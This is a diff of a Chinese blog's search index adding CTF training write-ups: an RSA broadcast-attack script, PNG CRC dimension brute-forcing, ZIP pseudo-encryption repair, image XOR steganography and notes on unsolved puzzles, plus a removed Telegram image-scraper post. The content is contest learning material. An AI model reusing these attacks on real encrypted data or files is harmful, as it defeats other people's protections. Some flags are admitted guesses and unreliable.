+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gmpy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_parse_number</span>(<span class="params">number</span>):</span><br><span class="line">    string = <span class="string">&quot;%x&quot;</span> % number</span><br><span class="line">    <span class="comment">#if len(string) != 64:</span></span><br><span class="line">    <span class="comment">#    return &quot;&quot;</span></span><br><span class="line">    erg = []</span><br><span class="line">    <span class="keyword">while</span> string != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        erg = erg + [<span class="built_in">chr</span>(<span class="built_in">int</span>(string[:<span class="number">2</span>], <span class="number">16</span>))]</span><br><span class="line">        string = string[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(erg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    x,y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    lastx, lasty = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, (q, b) = b, <span class="built_in">divmod</span>(a,b)</span><br><span class="line">        x, lastx = lastx-q*x, x</span><br><span class="line">        y, lasty = lasty-q*y, y</span><br><span class="line">    <span class="keyword">return</span> (lastx, lasty, a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder_theorem</span>(<span class="params">items</span>):</span><br><span class="line">  N = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">    N *= n</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">    m = N//n</span><br><span class="line">    r, s, d = extended_gcd(n, m)</span><br><span class="line">    <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">      N=N/n</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">      <span class="comment">#raise &quot;Input not pairwise co-prime&quot;</span></span><br><span class="line">    result += a*s*m</span><br><span class="line">  <span class="keyword">return</span> result % N, N</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1 = m**e mod n1</span></span><br><span class="line"><span class="string">c2 = m**e mod n2</span></span><br><span class="line"><span class="string">c3 = m**e mod n3</span></span><br><span class="line"><span class="string">. .</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sessions=[&#123;<span class="string">&quot;c&quot;</span>: <span class="number">2664456240866799628123354002961100780678777039452838534772316015487055657626151267255765909925238851052963177690615857269355367306531947285275658480119132176458619666356498982335615976520110220831553046336962209497199269751531446896806745547821273188359881207253304353340193045529947532321421316207582669186966262885925510852080336597611720270953364182776647640895915836757533572112922353511839592221769714011077657473370681864919378759906166093497668584965809250367719086157929143483067084526466393322021886107145372853920384593331401647566014964198106822275155018727443981449124990082600675418608431513247974233406</span>, <span class="string">&quot;e&quot;</span>: <span class="number">3</span>, <span class="string">&quot;n&quot;</span>: <span class="number">16158503998777337192674807945908821386693302597406387444349699542598095897285692091211476083809918750897861769264465663579793991679314429752295361957446059739359063103544638030154853387212724326557655148019702164400877330186327609348721648084613268414555203577183573889217351893673924371072333289354228674760315294504839359655489521012677566131327841053678744664608889174603997019849103346541029516404589134950647019313518381914869229067797614481107128126689730344210547636672896855115883318917823168989617075675281028751941660136853501327782175932311318584187206520215509966133929719351504589815606927966176149195779</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">8141444293590939926339140123606008320647283862734921035349993152736573212703175057344759120176139012159033736316173682242298057686577598027916977530077029856485627175379314811877501994761319423200265287785759453820095015807444949214265244900640835658881784054368646315441712319010363526404565445161985028402390954712866106921908734210919493250702187032275110124875570931002934221972634821225056433936935859313342958691599902102787445475305941582660308223893978598257522846759968671416599167447071747751521028177865487587852125772706197522666828868692341809398348371017535491453879955859658955741930595458023438100360</span>, <span class="string">&quot;e&quot;</span>: <span class="number">3</span>, <span class="string">&quot;n&quot;</span>: <span class="number">32317006071311007300714876688669951960444102669715484032130345427525853843244805988476588891865958825360448605290048592734632332583370763153757718383572299749209540231288997719992234568181178226221179583987114390330645720300200969658014581064237644699938356963972432409945268139827411216302358245968648685631852162149417921884611499140034180764281310426002777325893540359517405108625457448469440495488988134588122686723870538630903173922667307922091719215351000831684798921623126319342120005518066740737893055076255035167681805650095125693219744392056464805973406041558289941338164246139243161281441192654245812544809</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">32186692144821382556216414197036084450002406028322550030603281663242416068106078282460625499374288627277856236842632516201785581944392028997860442197688447471167439623993997293924922369564496861634056297046007484347428266405265850123438755524763475428402354354249708937585215741306623413807430961934859288170402397120084830356448790691150552044932030386388033322020053166574933222485614505111408006503260110878032569297769908686840698298294276083052356237977129947951638366162505197545851558874564120929824886880546857109477962821888212631753191393081515047983305638857450728393479191251293759249543719567211830591890</span>, <span class="string">&quot;e&quot;</span>: <span class="number">3</span>, <span class="string">&quot;n&quot;</span>: <span class="number">32317006071311007300714876688669951960444102669715484032130345427524655138867890893197201411522913463688717960921898019494119559150490921095088152386448283120630877367300996091750197750389652106796057638384067568276792218642619756161838094338476170470581645852036305042887575891768950486750990609730626074204953069170365351039844202147563211921699195999562457720327836338730130880314152322204629124008956222526289905774520564846695102147923912430235289375056683956240708354173616548191256839933106531936657610976268878493644409501763510589523424550621212340120772084161285303618671573000124518317607283263174664732027</span>&#125;]</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> session <span class="keyword">in</span> sessions:</span><br><span class="line">    e=session[<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">    n=session[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">    msg=session[<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">    data += [(msg, n)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Please wait, performing CRT&quot;</span>)</span><br><span class="line">x, n = chinese_remainder_theorem(data)</span><br><span class="line">e=session[<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">realnum = gmpy.iroot(x,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(realnum)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到最终结果</p>
+<p>134491505866050799518149049116410640504801097393689986282578875171467764060356652949245541838134430726585819015055443577486765212620027434842249657064471879286694101508916323731138545953360768175582990398279608814586282578875171467764060356652949245541838134430727023319615912208504801097393689986282578875</p>
+<p><strong>根据Crypto第二题ez_crypto下flag取后9位的提示，得到flag为</strong></p>
+<p>flag{282578875}</p>
+<p><del>很离谱吗？是的，很离谱，更离谱的是ez_cypto怎么算都是m&#x3D;512347890123，尝试提交flag几十遍都是错的</del></p>
+<h2 id="Unsolved-Problem"><a href="#Unsolved-Problem" class="headerlink" title="Unsolved Problem"></a>Unsolved Problem</h2><h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x05-misc2"><a href="#0x05-misc2" class="headerlink" title="0x05 misc2"></a>0x05 misc2</h4><p>图种格式，拆分为png+2*rar，png内容”secret is here”，rar内容5characters.txt加密</p>
+<p>png：</p>
+<p>没有找出更多隐写相关的线索</p>
+<p>5characters.txt：</p>
+<p>推测解压密码为5位字符，爆破时间需要2天多，放弃；内容为13位，推测为flag{XXXXXXX}，CRC32绕过需要7位，放弃</p>
+<h3 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="0x06-base"><a href="#0x06-base" class="headerlink" title="0x06 base"></a>0x06 base</h4><p>hint.txt内容为16，推测为base16</p>
+<p>base.txt内容为brainfuck加密和3538，解密之后为base和3538，将3538用base16（十六进制）解密后为58，合起来内容为base58，这是一种bitcoin的编码方式</p>
+<p>然后没了，试了一堆都试不出来</p>
+<h4 id="0x07-ez-cypto"><a href="#0x07-ez-cypto" class="headerlink" title="0x07 ez_cypto"></a>0x07 ez_cypto</h4><p>挺离谱的，RSA共模攻击，求出m&#x3D;512347890123，提示flag为后9位，我也挺想知道flag是啥的</p>
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Hacker</category>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>NeSE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NeSE丙队5月月赛训练</title>
+    <url>/2021/05/29/NeSE%E4%B8%99%E9%98%9F5%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x00-嗷呜"><a href="#0x00-嗷呜" class="headerlink" title="0x00 嗷呜"></a>0x00 嗷呜</h4><p>简单查一下，兽音加密，直接 <a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a> 输入内容，得到一串01数组</p>
+<p>01数组共841位，简单的29*29，估计是二维码，简单处理一下</p>
+<p>代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">from zlib import *</span><br><span class="line"></span><br><span class="line">MAX = 29</span><br><span class="line">pic = Image.new(&quot;RGB&quot;,(MAX,MAX))</span><br><span class="line">str =&quot;1111111011000110100000111111110000010010001110001001000001101110100101101001001010111011011101010100000001000101110110111010101000000110001011101100000101011100010110010000011111111010101010101010111111100000000100001011101100000000100010111010010001011111110010111110011000110101001011010101000010001010001110000101101001001000110001001100001010010111101001111111110101010000000111101101100000000101011001110111101101011100000000011011001000100101101110010110101100001010100111000101010000011110101001000011011000011101010010111001001000111011000110100011000000100100111101111010111100101000011110101111110100000000010010000011010001010111111110110011110010101011001100000100100010110011000110001011101011101100000111111010110111010011001101011110000010101110100001001011000100011111000001000001000011111100101111111110110010111011110101010&quot;</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">for y in range(0,MAX):</span><br><span class="line">    for x in range(0,MAX):</span><br><span class="line">        if(str[i] == &#x27;1&#x27;):</span><br><span class="line">            pic.putpixel([x,y],(0,0,0))</span><br><span class="line">        else:pic.putpixel([x,y],(255,255,255))</span><br><span class="line">        i = i+1</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><a href="/images/qpQNZDAvgS82I8ZQZ730rA.png" class="gallery-item"><img src="/images/qpQNZDAvgS82I8ZQZ730rA.png"></a></p>
+<p>flag{we_mia0_mia0_t0gether}</p>
+<h4 id="0x01-crypto-0range"><a href="#0x01-crypto-0range" class="headerlink" title="0x01 crypto_0range"></a>0x01 crypto_0range</h4><p>过于简单的签到题</p>
+<p>base64解第一行：523641</p>
+<p>第二行看前6位出现flag{的标志，直接重新排序即可得到flag{crypto_is_magical!}</p>
+<h4 id="0X02-ultra-combine"><a href="#0X02-ultra-combine" class="headerlink" title="0X02 ultra_combine"></a>0X02 ultra_combine</h4><p>1.png 无法打开，但是可以直接用Stegsolve.jar查看，文件长宽500*359，CRC32值为0x2ca75026，直接上代码爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc = open(&quot;1.png&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line"># 爆破宽</span><br><span class="line">for i in range(1024):</span><br><span class="line">	data = misc[12:16] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[20:29]  #IHDR数据</span><br><span class="line">	crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">	if crc32 == 0x2ca75026: #IHDR块的crc32值</span><br><span class="line">		print(i)</span><br><span class="line">		print(&quot;hex:&quot;+hex(i))</span><br><span class="line"></span><br><span class="line"># 爆破高		</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data = misc[12:20] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[24:29]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 == 0x2ca75026:</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot;+hex(i))</span><br></pre></td></tr></table></figure>
+
+<p>得到长宽应该为500*396，进入010editor修改，得到图1完整图片</p>
+<p><a href="/images/LBKQmvHn6GNC0Ua4AyfRdg.png" class="gallery-item"><img src="/images/LBKQmvHn6GNC0Ua4AyfRdg.png"></a></p>
+<p>2.zip压缩包需要密码，先猜测是伪加密，直接winrar修复文件，拿到图片。查看EXIF信息，得到如下数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名: 2.jpg</span><br><span class="line">图片大小: 120.2KB</span><br><span class="line">修改日期: 2021/05/06 00:30:26</span><br><span class="line">图片信息: 500x500 (Jpeg,YUV444)</span><br><span class="line">软件: 2is-AllHailUltra0</span><br><span class="line">艺术家: Meitu</span><br><span class="line">拍摄日期: 2021/04/10 16:24:51</span><br><span class="line">评论: &#123;&quot;Version&quot;:&quot;1.0.0&quot;,&quot;BeautyInfo&quot;:&#123;&quot;IsAIBeauty&quot;:false,&quot;IsOldBeauty&quot;:false,&quot;IsSkinColour&quot;:false,&quot;SwitchMedicatedAcne&quot;:false,&quot;IsBrightEyes&quot;:false,&quot;IsReduceBlackEyes&quot;:false,&quot;IsSharpen&quot;:false&#125;,&quot;FaceliftInfo&quot;:&#123;&quot;IsChangeFacelift&quot;:false,&quot;IsChangeThinFace&quot;:false,&quot;IsChangeEyeLift&quot;:false,&quot;IsChangeFaceChin&quot;:false,&quot;IsChangeNose&quot;:false,&quot;IsChangeMouth&quot;:false&#125;,&quot;FilterInfo&quot;:&#123;&quot;IsUseFilter&quot;:false&#125;,&quot;ARInfo&quot;:&#123;&quot;IsUseAR&quot;:false&#125;,&quot;MakeupInfo&quot;:&#123;&quot;IsUseMakeup&quot;:false&#125;,&quot;HandlerInfo&quot;:&#123;&quot;AppName&quot;:2&#125;,&quot;SoftHairInfo&quot;:&#123;&quot;IsUseSoftHair&quot;:false&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比较显著的信息是软件名2is-AllHailUltra0</p>
+<p>12.zip是个真实加密的压缩包，看名字应该是1.png得到的信息和2.zip得到的信息结合，经过测试压缩密码为M78AllHailUltra0，解压得到一个无后缀文件12</p>
+<p>010editor查看12文件二进制格式，具备IHDR和IEND，且文件头格式为PNG文件格式，将后缀改成.png，发现无法打开。继续查看，发现一开始的8950被改成了8059，修改回去之后得到png图片</p>
+<p><a href="/images/MDslJlbMsu_eKha41WrT8A.png" class="gallery-item"><img src="/images/MDslJlbMsu_eKha41WrT8A.png"></a></p>
+<p>得到flag{Easy_Combine_for_Best_Hikari}</p>
+<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x03-cryptobmp"><a href="#0x03-cryptobmp" class="headerlink" title="0x03 cryptobmp"></a>0x03 cryptobmp</h4><p>一道隐写题，为啥会放在加密里面？</p>
+<p>打开result.bmp图片，可以在图片中央隐约看出存在内容信息</p>
+<p>上Stegsolve.jar看图片信息和各信道信息，没有结果</p>
+<p>色盲图一样的信息，感觉需要用颜色XOR把中间内容提取出来，打开010editor，将重复的信息提取出来，然后重复填充进后面的内容，保留最后一块和文件大小不变</p>
+<p><a href="/images/JgoJIbhRzZJmgFQ9RleA3g.png" class="gallery-item"><img src="/images/JgoJIbhRzZJmgFQ9RleA3g.png"></a></p>
+<p>用Stegsolve.jar异或叠加图片得到flag{c7FHe110n006}</p>
+<p><a href="/images/7AyLv1btjbin34I_aZEXYQ.png" class="gallery-item"><img src="/images/7AyLv1btjbin34I_aZEXYQ.png"></a></p>
+<h2 id="unsolved"><a href="#unsolved" class="headerlink" title="unsolved"></a>unsolved</h2><h4 id="0x04-IFDEMSKOIVB"><a href="#0x04-IFDEMSKOIVB" class="headerlink" title="0x04 IFDEMSKOIVB"></a>0x04 IFDEMSKOIVB</h4><p>标题和正文内容都经过加密或者编码</p>
+<p>看正文内容只包含数字{2-7}字母{A-Z}推测加密为base32，解密标题为</p>
+<p>AFFINECTF</p>
+<p>看上去是仿射加密，但是缺少仿射公式，正文内容也无法用base32解密，也不能用”flag{“去逆推，暂时卡住了</p>
+<p>将正文按照出现频次最高的7G分隔，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7GATL5FR7W2W7KQIF3CDLQVAYS</span><br><span class="line">7G7DCDSDVQ7D5LSG2QZXVY</span><br><span class="line">7G6TF5KJ7KGG56VKED</span><br></pre></td></tr></table></figure>
+
+<p>按照7和G对应RFC4648的值a&#x3D;31和b&#x3D;6进行仿射加密和解密，将仿射结果用base32解密，失败</p>
+<hr>
+<p>看了wp，说是爆破标题的<code>IFDEMSKOIVBVIRQ</code>和<code>7GATL5FR7W2W7KQ</code>得出仿射参数a和b</p>
+<p>黑人问号？？？你这最后一个Q一看就没仿射啊</p>
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Hacker</category>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>NeSE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Selenium自动化网页流量生成的设计与实现</title>
     <url>/2021/09/15/Selenium%E6%A8%A1%E6%8B%9F%E7%BD%91%E9%A1%B5%E4%BA%A4%E4%BA%92%E5%B9%B6%E7%94%9F%E6%88%90%E6%B5%81%E9%87%8F/</url>
     <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h2><p>在网络流量分析研究中，构建真实的用户访问行为模型需要大量正常的网页交互流量。本系统通过Selenium自动化技术模拟真实用户行为，访问ChinaZ站长之家排名前500的网站，自动生成高质量的流量数据用于恶意流量分析研究。</p>
@@ -762,58 +906,6 @@
       <tags>
         <tag>Study life</tag>
         <tag>Traffic Analysis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基于Telegram机器人的图片爬虫</title>
-    <url>/2021/12/20/%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96telegram%E5%8F%91%E5%9B%BE%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%BE%E7%89%87%E5%86%85%E5%AE%B9/</url>
-    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="项目概述"><a href="#项目概述" class="headerlink" title="项目概述"></a>项目概述</h2><p>本文将详细介绍如何通过Python爬虫技术，从Telegram的图片机器人获取图片内容，并将这些图片集成到QQ机器人中实现跨平台转发功能。</p>
-<h2 id="技术实现流程"><a href="#技术实现流程" class="headerlink" title="技术实现流程"></a>技术实现流程</h2><h3 id="1-获取Telegram图片链接"><a href="#1-获取Telegram图片链接" class="headerlink" title="1. 获取Telegram图片链接"></a>1. 获取Telegram图片链接</h3><p>首先通过Telegram客户端操作获取目标机器人的图片分享链接：</p>
-<ol>
-<li>选择需要爬取的机器人消息</li>
-<li>点击”转发”选项</li>
-<li>选择”复制链接”</li>
-</ol>
-<p><a href="/images/image-20211220103054655.png" title="image-20211220103054655" class="gallery-item"><img src="/images/image-20211220103054655.png" alt="image-20211220103054655"></a></p>
-<p>典型链接格式为：<code>https://t.me/botmzt/XXXX?single</code>，其中<code>XXXX</code>为图片的唯一数字编号。</p>
-<h3 id="2-分析图片存放机制"><a href="#2-分析图片存放机制" class="headerlink" title="2. 分析图片存放机制"></a>2. 分析图片存放机制</h3><p>通过浏览器开发者工具分析图片加载过程：</p>
-<ol>
-<li>在浏览器中打开获得的链接</li>
-<li>按F12打开开发者工具</li>
-<li>切换到”网络(Network)”标签</li>
-<li>观察图片资源的实际请求地址</li>
-</ol>
-<p><a href="/images/image-20211220123312110.png" title="image-20211220123312110" class="gallery-item"><img src="/images/image-20211220123312110.png" alt="image-20211220123312110"></a></p>
-<p>可以发现实际图片请求常带有<code>embed=1&amp;single=1</code>参数。</p>
-<h3 id="3-实现爬虫代码"><a href="#3-实现爬虫代码" class="headerlink" title="3. 实现爬虫代码"></a>3. 实现爬虫代码</h3><p>基于Python实现完整的爬虫功能：</p>
-<p>然后分析<a href="https://t.me/botmzt/XXXX?embed=1&single=1%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E6%89%BE%E5%88%B0%E5%9B%BE%E7%89%87%E5%AF%B9%E5%BA%94%E7%9A%84url%E3%80%82%E5%90%8C%E6%97%B6%E6%89%BE%E5%88%B0%E6%97%A0%E5%9B%BE%E7%89%87%E6%97%B6%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%88%A4%E5%88%AB%E6%9D%A1%E4%BB%B6">https://t.me/botmzt/XXXX?embed=1&amp;single=1的源码，找到图片对应的url。同时找到无图片时的源码，作为一个判别条件</a></p>
-<p>通过之前文章的代理内容，我们可以写爬虫代码直接下载图片内容</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 配置部分</span></span><br><span class="line">prefix_url = <span class="string">&quot;https://t.me/botmzt/&quot;</span></span><br><span class="line">suffix_url = <span class="string">&quot;?embed=1&amp;single=1&quot;</span></span><br><span class="line">file_url = <span class="string">&quot;./picCache/&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelegramImageCrawler</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_latest_image_num</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取最新的图片编号&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 实现省略.</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_image</span>(<span class="params">self, image_num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;下载指定编号的图片&quot;&quot;&quot;</span></span><br><span class="line">        target_url = <span class="string">f&quot;<span class="subst">&#123;prefix_url&#125;</span><span class="subst">&#123;image_num&#125;</span><span class="subst">&#123;suffix_url&#125;</span>&quot;</span></span><br><span class="line">        response = <span class="variable language_">self</span>.session.get(target_url, proxies=proxies, headers=headers)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        pic_data = soup.find_all(<span class="string">&#x27;a&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;js-message_photo&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> pic_data:</span><br><span class="line">            img_style = pic_data[<span class="number">0</span>][<span class="string">&#x27;style&#x27;</span>]</span><br><span class="line">            img_url = re.search(<span class="string">&#x27;https:.*?jpg&#x27;</span>, img_style).group()</span><br><span class="line">            </span><br><span class="line">            img_data = <span class="variable language_">self</span>.session.get(img_url, proxies=proxies, headers=headers).content</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;/data/images/<span class="subst">&#123;image_num&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img_data)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">batch_download</span>(<span class="params">self, start_num, end_num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;批量下载图片&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(start_num, end_num+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在下载图片 #<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.download_image(num)</span><br></pre></td></tr></table></figure>
-
-<h2 id="关键技术点"><a href="#关键技术点" class="headerlink" title="关键技术点"></a>关键技术点</h2><ol>
-<li><strong>代理配置</strong>：使用SOCKS5代理访问Telegram</li>
-<li><strong>异常处理</strong>：检测<code>tgme_widget_message_error</code>类判断无效消息</li>
-<li><strong>图片识别</strong>：通过BeautifulSoup解析DOM结构获取图片URL</li>
-<li><strong>文件存储</strong>：将下载的图片按编号保存到本地</li>
-</ol>
-<h2 id="系统集成"><a href="#系统集成" class="headerlink" title="系统集成"></a>系统集成</h2><p>将爬虫功能集成到go-cqhttp机器人的基本思路：</p>
-<ol>
-<li>设置定时任务定期检查新图片</li>
-<li>下载新图片到本地存储</li>
-<li>通过QQ机器人接口发送图片</li>
-<li>记录已处理的图片编号防止重复</li>
-</ol>
